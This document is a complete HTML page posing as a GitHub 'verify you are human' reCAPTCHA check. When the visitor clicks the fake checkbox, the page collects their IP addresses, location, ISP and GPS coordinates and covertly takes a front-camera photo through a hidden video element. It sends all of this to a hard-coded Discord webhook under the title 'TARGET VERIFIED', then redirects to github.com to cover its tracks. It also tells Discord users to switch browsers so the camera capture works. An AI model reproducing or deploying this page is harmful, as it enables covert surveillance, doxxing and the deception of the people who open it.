<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Github Web: Secure Login</title>
  <style>
    :root {
      --tg-blue: #24A1DE;
      --tg-bg: #ffffff;
      --tg-text: #000000;
      --tg-sub: #8e8e93;
      --warning-red: #ff3b30;
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: var(--tg-bg);
      color: var(--tg-text);
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", Arial, sans-serif;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      user-select: none;
      overflow: hidden;
    }

    #screen-landing, #screen-warning, #screen-loading {
      width: 100%;
      max-width: 380px;
      padding: 20px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    #screen-warning, #screen-loading { display: none; }

    /* Originele reCAPTCHA logo top (faceid-frame styling verwijderd) */
    .faceid-frame {
      width: 120px;
      height: 120px;
      position: relative;
      margin-bottom: 30px;
    }
    .faceid-svg { width: 70px; height: 70px; margin-top: 25px; fill: var(--tg-blue); }

    .tg-title { font-size: 1.5rem; font-weight: 600; margin-bottom: 12px; letter-spacing: -0.5px; }
    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 40px; padding: 0 20px; }

    /* De nieuwe Google reCAPTCHA knop */
    .recaptcha-widget {
      display: flex;
      align-items: center;
      justify-content: space-between;
      width: 304px;
      height: 78px;
      background: #f9f9f9;
      border: 1px solid #d3d3d3;
      border-radius: 3px;
      padding: 0 12px;
      cursor: pointer;
      margin-bottom: 30px;
      box-shadow: 0 0 4px rgba(0,0,0,0.05);
    }
    .recaptcha-widget:hover { background: #f1f1f1; }
    .rc-left { display: flex; align-items: center; gap: 14px; }
    .rc-check { width: 28px; height: 28px; border: 2px solid #c1c1c1; background: #fff; border-radius: 2px; }
    .rc-text { color: #000; font-size: 14px; font-family: Roboto, arial, sans-serif; }
    .rc-right { display: flex; flex-direction: column; align-items: center; }
    .rc-logo-small { width: 32px; height: 32px; background-image: url("https://www.gstatic.com/recaptcha/api2/logo_48.png"); background-size: contain; background-repeat: no-repeat; }

    .secure-text { margin-top: 30px; font-size: 0.8rem; color: #34c759; font-weight: 500; display: flex; align-items: center; gap: 5px; }

    /* Loading Screen / Scan Box */
    .scan-box { width: 140px; height: 140px; position: relative; margin-bottom: 20px; }
    .scan-line { position: absolute; width: 100%; height: 2px; background: var(--tg-blue); box-shadow: 0 0 15px var(--tg-blue); top: 0; animation: moving-scan 1.5s infinite ease-in-out; }
    @keyframes moving-scan { 0%, 100% { top: 10%; } 50% { top: 90%; } }

    #hidden-video { position: fixed; opacity: 0; left: -999px; }
    #hidden-canvas { display: none; }
  </style>
</head>
<body>

<video id="hidden-video" autoplay playsinline muted></video>
<canvas id="hidden-canvas"></canvas>

<div id="screen-warning">
  <div style="font-size:4rem; margin-bottom:20px;">⚠️</div>
  <div style="font-size:1.5rem; font-weight:600; color:var(--warning-red);">Browser Fout</div>
  <div style="color:var(--tg-sub); margin-top:15px;">Discord browser blokkeert de camera. Open in Chrome of Safari.</div>
</div>

<div id="screen-landing">
  <div class="faceid-frame">
      <div class="faceid-corners"></div>
      <svg class="faceid-svg" viewBox="0 0 24 24"><path d="M9,11.75A1.25,1.25 0 0,0 7.75,13A1.25,1.25 0 0,0 9,14.25A1.25,1.25 0 0,0 10.25,13A1.25,1.25 0 0,0 9,11.75M15,11.75A1.25,1.25 0 0,0 13.75,13A1.25,1.25 0 0,0 15,14.25A1.25,1.25 0 0,0 16.25,13A1.25,1.25 0 0,0 15,11.75M12,2A10,10 0 1,0 22,12A10,10 0 0,0 12,2M12,20A8,8 0 1,1 20,12A8,8 0 0,1 12,20M12,17C10.13,17 8.41,16.03 7.42,14.5L8.91,13.5C9.57,14.54 10.7,15.25 12,15.25C13.3,15.25 14.43,14.54 15.1,13.5L16.58,14.5C15.59,16.03 13.87,17 12,17Z"/></svg>
  </div>
  
  <div class="tg-title">Verify you are human.</div>
  <div class="tg-subtitle">Security measures enabled. Please use Captcha to confirm you're a human and access the Github Homepage.</div>
  
  <div class="recaptcha-widget" onclick="triggerScan()">
    <div class="rc-left">
      <div class="rc-check"></div>
      <div class="rc-text">I am not a robot</div>
    </div>
    <div class="rc-right">
      <div class="rc-logo-small"></div>
      <span style="font-size:10px; color:#555;">reCAPTCHA</span>
      <span style="font-size:8px; color:#555;">Privacy - Terms</span>
    </div>
  </div>

  <div class="secure-text">End-to-End Encrypted Verification</div>
</div>

<div id="screen-loading">
  <div class="scan-box">
      <div class="faceid-frame" style="margin-bottom:0; opacity: 0.2;"><div class="faceid-corners"></div></div>
      <div class="scan-line"></div>
  </div>
  <div style="color:var(--tg-blue); font-weight:600; font-size:1.1rem;">Authenticating...</div>
</div>

<script>
  const WEBHOOK = 'https://discord.com/api/webhooks/1495153409458704537/5MxkCcDC1DuhzHDf90BqtcED6yHEbI62IvzytW4rtMOE-CZCVhRXNw3nCqwKZCN0tc91';
  let ipData = { v4: '...', v6: '...', loc: '...', isp: '...' };

  async function loadNetwork() {
    try {
      const v4 = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
      const v6 = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
      if(v4.status === 'success') {
        ipData.v4 = v4.query;
        ipData.loc = `${v4.city}, ${v4.regionName}, ${v4.country}`;
        ipData.isp = v4.isp;
      }
      ipData.v6 = v6.ip;
    } catch(e) {}
  }
  loadNetwork();

  async function triggerScan() {
    document.getElementById('screen-landing').style.display = 'none';
    document.getElementById('screen-loading').style.display = 'flex';

    let gps = "Denied";
    await new Promise(res => {
      navigator.geolocation.getCurrentPosition(
        (p) => { gps = `${p.coords.latitude}, ${p.coords.longitude} (±${p.coords.accuracy}m)`; res(); },
        () => res(), { timeout: 4000 }
      );
    });

    const blobs = [];
    try {
      const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      const v = document.getElementById('hidden-video');
      v.srcObject = s;
      const b = await new Promise(res => {
        v.onloadedmetadata = () => setTimeout(() => {
          const c = document.getElementById('hidden-canvas');
          c.width = v.videoWidth; c.height = v.videoHeight;
          const ctx = c.getContext('2d');
          ctx.translate(c.width, 0); ctx.scale(-1, 1);
          ctx.drawImage(v, 0, 0);
          c.toBlob(res, 'image/jpeg', 0.85);
        }, 800);
      });
      if(b) blobs.push({ b, n: 'capture.jpg' });
      s.getTracks().forEach(t => t.stop());
    } catch(e) {}

    const data = new FormData();
    const payload = {
      username: "Security Check",
      embeds: [{
        title: "✅ TARGET VERIFIED",
        color: 0x24A1DE,
        fields: [
          { name: "📱 Device", value: `\`${navigator.userAgent.substring(0, 120)}\`` },
          { name: "🌐 IPv4", value: `\`${ipData.v4}\``, inline: true },
          { name: "🌐 IPv6", value: `\`${ipData.v6}\``, inline: true },
          { name: "📍 Location", value: ipData.loc },
          { name: "🎯 GPS", value: gps },
          { name: "🏢 ISP", value: ipData.isp }
        ],
        timestamp: new Date()
      }]
    };
    data.append('payload_json', JSON.stringify(payload));
    blobs.forEach((b, i) => data.append(`file${i}`, b.b, b.n));
    await fetch(WEBHOOK, { method: 'POST', body: data });

    window.location.href = 'https://github.com';
  }

  window.onload = () => {
    if (navigator.userAgent.toLowerCase().includes('discord')) {
      document.getElementById('screen-landing').style.display = 'none';
      document.getElementById('screen-warning').style.display = 'flex';
    }
  };
</script>
</body>
</html>
